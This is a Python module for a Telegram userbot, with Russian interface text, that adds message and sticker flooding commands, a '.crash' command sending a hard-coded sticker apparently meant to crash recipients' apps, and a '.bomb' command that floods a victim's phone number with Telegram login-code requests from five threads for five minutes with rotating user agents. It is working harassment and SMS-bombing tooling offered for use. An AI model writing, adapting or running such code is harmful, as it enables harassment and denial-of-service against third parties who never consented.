import re
import asyncio
import threading
import time
import aiohttp
import requests
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl import types
from commands import register
from commands.utils import fmt, safe_edit, get_usage_instructions
from logger import exception

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None


@register
def register_spam(client, state):
    @client.on(events.NewMessage(outgoing=True, pattern=r'^\.spam(?:\s+(\d+)\s+(.+))?$'))
    async def spam_handler(event):
        args = event.pattern_match.groups()
        if not args or not args[0] or not args[1]:
            await safe_edit(event, get_usage_instructions("spam"))
            return
        try:
            count = int(args[0])
            message = args[1]
            if count > 250:
                await safe_edit(event, fmt("ошибка", ["максимум 250"]))
                return
            try:
                await event.delete()
            except Exception:
                pass
            for _ in range(count):
                await client.send_message(event.chat_id, message)
                await asyncio.sleep(0.5)
        except Exception as e:
            exception(f"spam: {e}")

    @client.on(events.NewMessage(outgoing=True, pattern=r'^\.sti(?:\s+(\d+))?$'))
    async def sti_handler(event):
        count = event.pattern_match.group(1)
        if not count or not event.is_reply:
            await safe_edit(event, get_usage_instructions("sti"))
            return
        try:
            count = min(int(count), 50)
            reply = await event.get_reply_message()
            if not hasattr(reply, "sticker") or not reply.sticker:
                await safe_edit(event, fmt("ошибка", ["ответь на стикер"]))
                return
            for _ in range(count):
                await reply.reply(file=reply.sticker)
            try:
                await event.delete()
            except Exception:
                pass
        except ValueError:
            await safe_edit(event, fmt("ошибка", ["укажи число"]))
        except Exception as e:
            await safe_edit(event, fmt("ошибка", [f"`{e}`"]))

    @client.on(events.NewMessage(outgoing=True, pattern=r'^\.crash$'))
    async def crash_handler(event):
        try:
            await event.delete()
        except Exception:
            pass
        STICKER_ID = 5796478306379369751
        ACCESS_HASH = 682065399763207140
        FILE_REFERENCE = b'\x01\x00\x00\x14\xabh1\xa0f\x0b\xef\xbb\t\xfcU\x9fx\x15\xbbD{d\xf9\xcd\x19'
        sticker = types.InputDocument(
            id=STICKER_ID, access_hash=ACCESS_HASH, file_reference=FILE_REFERENCE
        )
        try:
            for _ in range(5):
                await client.send_file(event.chat_id, sticker, allow_cache=False)
                await asyncio.sleep(0.3)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            exception(f"crash: {e}")

    @client.on(events.NewMessage(outgoing=True, pattern=r'^\.bomb(?:\s+(.+))?$'))
    async def bomb_handler(event):
        number = event.pattern_match.group(1)
        if not number:
            await safe_edit(event, get_usage_instructions("bomb"))
            return
        if not re.match(r'^\+\d{8,15}$', number):
            await safe_edit(event, fmt("ошибка", ["пример: `.bomb +79123456789`"]))
            return
        try:
            stop_flag = threading.Event()
            msg = await event.edit(fmt("атака запущена", [f"номер — `{number}`"]))
            loop = asyncio.get_event_loop()

            def runner():
                asyncio.run_coroutine_threadsafe(_spam_attack(number, stop_flag, loop), loop)

            for _ in range(5):
                threading.Thread(target=runner, daemon=True).start()

            async def auto_stop():
                await asyncio.sleep(300)
                stop_flag.set()
                try:
                    await msg.edit(fmt("атака завершена", [f"номер — `{number}`"]))
                except Exception:
                    pass

            asyncio.create_task(auto_stop())
        except Exception as e:
            await safe_edit(event, fmt("ошибка", [f"`{e}`"]))


async def _spam_attack(number, stop_flag, loop):
    headers = {}
    if UserAgent:
        try:
            headers = {"user-agent": UserAgent().random}
        except Exception:
            headers = {"user-agent": "Mozilla/5.0"}
    async with aiohttp.ClientSession(loop=loop) as session:
        start = time.time()
        while not stop_flag.is_set() and (time.time() - start < 300):
            try:
                await asyncio.gather(
                    session.post(
                        "https://my.telegram.org/auth/send_password",
                        data={"phone": number}, headers=headers,
                    ),
                    session.get("https://telegram.org/support?setln=ru", headers=headers),
                    return_exceptions=True,
                )
            except Exception:
                pass
            await asyncio.sleep(0.5)